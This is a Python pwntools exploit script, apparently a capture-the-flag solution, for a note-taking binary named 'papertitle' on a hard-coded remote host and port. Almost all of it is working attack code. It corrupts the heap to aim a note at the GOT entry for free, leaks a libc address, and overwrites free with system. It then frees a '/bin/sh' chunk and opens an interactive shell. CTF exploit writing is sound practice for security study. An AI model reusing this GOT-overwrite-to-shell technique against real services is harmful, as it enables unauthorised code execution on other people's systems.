#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 139.59.117.189 --port 3006 ./papertitle
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./papertitle_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '139.59.117.189'
port = int(args.PORT or 3006)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
b *0x4015c6
b *0x4011d2
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def add(sz_title,sz_content,title,content):
    io.sendlineafter("> ",'2')
    io.sendlineafter("> ",str(sz_title))
    io.sendlineafter("> ",str(sz_content))
    io.sendlineafter("> ",str(title))
    io.sendlineafter("> ",str(content))

def view(idx):
    io.sendlineafter("> ",'3')
    io.sendlineafter("> ",str(idx))

def edit(idx,content):
    io.sendlineafter("> ",'4')
    io.sendlineafter("> ",str(idx))
    io.sendlineafter("> ",str(content))


def delete(idx):
    io.sendlineafter("> ",'5')
    io.sendlineafter("> ",str(idx))

libc = exe.libc

for i in range(4):
    add(0x40,0x40,'JUNK{}'.format(i),'JUNK')

delete(1)
delete(3)
add(0x30,0x40,p64(exe.got['free'])+p64(0x100)+p64(exe.got['free'])+"\x40","JUNK")

view(1)
io.recvuntil("[+] ")

leak = u64(io.recvuntil("[>] ",drop=True).ljust(8,"\x00"))
libc.address = leak - libc.sym['free']
print hex(libc.address)

for i in range(2):
    add(0x40,0x40,'JUNK{}'.format(i),'JUNK')

delete(2)
delete(3)

add(0x30,0x40,"/bin/sh\x00","JUNK")

p = p64(libc.sym['system'])
p += p64(libc.sym['puts'])
p += p64(libc.sym['printf'])
p += p64(libc.sym['fgets'])
edit(1,p)

delete(2)

io.interactive()

